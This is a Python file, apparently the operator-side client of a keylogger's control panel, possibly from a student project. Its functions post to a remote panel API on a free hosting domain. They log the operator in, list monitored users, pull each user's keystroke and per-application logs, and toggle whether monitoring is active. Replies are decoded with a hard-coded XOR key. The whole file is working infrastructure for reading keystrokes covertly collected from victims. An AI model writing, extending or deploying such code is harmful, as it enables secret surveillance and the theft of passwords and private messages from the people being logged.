import requests
import json
from tkinter.messagebox import showerror
import re

servername = "projectuniveristykeylogger.000webhostapp.com" 

class c_server:
    def auth(username, password):
        url = f"http://{servername}/panel/api/api.php"
        data = {
            "method": "auth",
            "username": username,
            "password": password
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            response = requests.post(url, data=data, headers=headers)

            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
            result = ""

            try:
                result = json.loads(c_server.decryptResponse(response.content))
            except json.JSONDecodeError as e:
                showerror(title="Ошибка", message=f"Error auth result: {result}, Error: {e}")
                print(f"Error auth: {result}, Error: {e}")
            
            if result["Status"] == "Successful standart user":
                return "Successful standart user"
            elif result["Status"] == "Successful admin user":
                return "Successful admin user"
            else:
                error_message = result["msg"]
                showerror(title="Ошибка", message=f"{error_message}")
                print(f"Error: {error_message}") # Incorrect user or password / Enter the username and password
            return result
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return result

    def getAllUsers():
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'allusers'
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes

            # Парсим строку, полученную от сервера
            users_data = c_server.decryptResponse(response.content)

            usernames = ""
 
            if "000webhost.com" in response.text: # fix for free shit hosting
                return usernames
            
            # Убираем перенос и разбиваем строку на отдельные имена
            usernames = [name.strip('\n') for name in users_data.split('\n') if name.strip()]
            
            return usernames
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return usernames

    def getLogs(item):
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'logs',
            'username': item 
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes

            decrypted_response = c_server.decryptResponse(response.content)  # Расшифровываем полученные данные

            decrypted_text_json_data = ""
            if "000webhost.com" in response.text: # fix for free shit hosting
                return decrypted_text_json_data

            if decrypted_response != "" and not "000webhost.com" in response.text: 
                try:
                    decrypted_text_json_data = json.loads(decrypted_response)
                    return decrypted_text_json_data
                except json.JSONDecodeError as e:
                    showerror(title="Ошибка", message=f"getLogs invalid log: {decrypted_text_json_data}, Error: {e}")
                    print(f"getLogs invalid log: {decrypted_text_json_data}, Error: {e}")
            return decrypted_text_json_data
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return decrypted_text_json_data    

    def getApplicationLogsByClick(username, application, application_title):
        url = f'http://{servername}/panel/api/api.php'
        data = {
            'method': 'getapplicationlogsbyclick',
            'username': username,
            'application_exe': application,
            'application_title': application_title
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)

            decrypted_text_data = c_server.decryptResponse(response.content)
            decrypted_text_json_data = ""

            if decrypted_text_data != "" and not "000webhost.com" in response.text: 
                try:
                    decrypted_text_json_data = json.loads(decrypted_text_data)
                    return decrypted_text_json_data
                except json.JSONDecodeError as e:
                    showerror(title="Ошибка", message=f"getApplicationLogsByClick invalid log: {decrypted_text_json_data}, Error: {e}")
                    print(f"getApplicationLogsByClick invalid log: {decrypted_text_json_data}, Error: {e}")
            return decrypted_text_json_data
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return decrypted_text_json_data

    def getApplicationLogs(item):
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'getapplicationlogs',
            'username': item 
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes

            decrypted_text_data = c_server.decryptResponse(response.content)
            decrypted_text_json_data = ""

            if decrypted_text_data != "" and not "000webhost.com" in response.text: # fix for free shit hosting
                try:
                    decrypted_text_json_data = json.loads(decrypted_text_data)
                    return decrypted_text_json_data
                except json.JSONDecodeError as e:
                    showerror(title="Ошибка", message=f"getApplicationLogs invalid log: {decrypted_text_json_data}, Error: {e}")
                    print(f"getApplicationLogs invalid log: {decrypted_text_json_data}, Error: {e}")
            
            return decrypted_text_json_data
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return decrypted_text_json_data    

    def getCurrentActive(item):
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'getactive',
            'username': item 
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
            
            # Парсим строку, полученную от сервера
            active_status = c_server.decryptResponse(response.content)
            
            if "000webhost.com" in response.text: # fix for free shit hosting
                return False

            return active_status

        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return False

    def setCurrentActive(item, var):
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'setactive',
            'username': item,
            'active': var
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes

            if "000webhost.com" in response.text: # fix for free shit hosting
                return False

            return True
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return False

    def decryptResponse(response_bytes):
        key = b"ztWuu0JVnaFm0rtDi1qd6Fwlus61MOkv"  # Используем байты
        key_len = len(key)

        decrypted_chars = bytearray()
        for i in range(len(response_bytes)):
            key_c = key[i % key_len]
            decrypted_c = response_bytes[i] ^ key_c
            decrypted_chars.append(decrypted_c)

        decrypted_response = decrypted_chars.decode('utf-8', errors='ignore')
        return decrypted_response